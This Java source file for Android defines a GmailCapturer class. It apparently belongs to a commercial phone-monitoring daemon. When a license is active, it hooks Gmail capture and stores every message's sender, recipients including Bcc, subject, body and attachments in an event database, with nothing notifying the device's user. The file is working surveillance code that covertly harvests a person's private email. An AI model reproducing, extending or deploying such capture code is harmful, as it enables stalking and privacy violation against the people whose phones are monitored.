package com.fx.maind.capture;

import java.util.ArrayList;

import android.content.Context;

import com.fx.event.Event;
import com.fx.event.EventEmail;
import com.fx.eventdb.EventDatabaseManager;
import com.fx.license.LicenseManager;
import com.fx.maind.ref.Customization;
import com.fx.maind.ref.MainDaemonResource;
import com.fx.preference.PreferenceManager;
import com.fx.util.FxResource;
import com.vvt.daemon.email.GmailCapturingManager;
import com.vvt.daemon.email.GmailCapturingManager.OnGmailCaptureListener;
import com.vvt.daemon.email.GmailData;
import com.vvt.logger.FxLog;

public class GmailCapturer implements OnGmailCaptureListener {

	private static final String TAG = "GmailCapturer";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private Context mContext;
	private EventDatabaseManager mEventDbManager;
	private GmailCapturingManager mGmailCapturingManager;
	private PreferenceManager mPreferenceManager;
	private LicenseManager mLicenseManager;
	
	public GmailCapturer(Context context) {
		mContext = context;
		mEventDbManager = EventDatabaseManager.getInstance(mContext);
		mPreferenceManager = PreferenceManager.getInstance(mContext);
		mLicenseManager = LicenseManager.getInstance(mContext);
		
		mGmailCapturingManager = new GmailCapturingManager(false);
		mGmailCapturingManager.setLoggablePath(MainDaemonResource.LOG_FOLDER);
		mGmailCapturingManager.setDateFormat(FxResource.DATE_FORMAT);
	}
	
	public void registerObserver() {
		mGmailCapturingManager.registerObserver(this);
		mGmailCapturingManager.startCapture();
	}
	
	public void unregisterObserver() {
		mGmailCapturingManager.unregisterObserver(this);
		mGmailCapturingManager.stopCapture();
	}

	@Override
	public void onCapture(ArrayList<GmailData> gmails) {
		
		if (!mLicenseManager.isActivated()) { 
			FxLog.d(TAG, "onCapture # Product is not activated!! -> EXIT");
			return;
		}
		
		boolean isCaptureEnabled = 
			mPreferenceManager.isCaptureEnabled() && 
				mPreferenceManager.isCaptureEmailEnabled();
		
		if (!isCaptureEnabled) {
			FxLog.d(TAG, "onCapture # Email is disabled!! -> EXIT");
			return;
		}
		
		EventEmail event = null;
		
		for (GmailData gmail : gmails) {
			
			short direction = gmail.isInbox() ? 
					Event.DIRECTION_IN : Event.DIRECTION_OUT;
			
			boolean isIncoming = direction == Event.DIRECTION_IN;
			String contactName = isIncoming ? 
					gmail.getSenderName() : 
						gmail.getReciverContactName();
			
			event = new EventEmail(mContext, 
					gmail.getDateTime(), 
					direction, 
					gmail.getSize(), 
					gmail.getSender(), 
					gmail.getTo(), 
					gmail.getCc(), 
					gmail.getBcc(), 
					gmail.getSubject(), 
					gmail.getAttachments(), 
					gmail.getBody(), 
					contactName);
			
			mEventDbManager.insert(event);
			if (LOGV) FxLog.v(TAG, String.format(
					"onCapture # Insert %s", event.getShortDescription()));
		}
	}
}
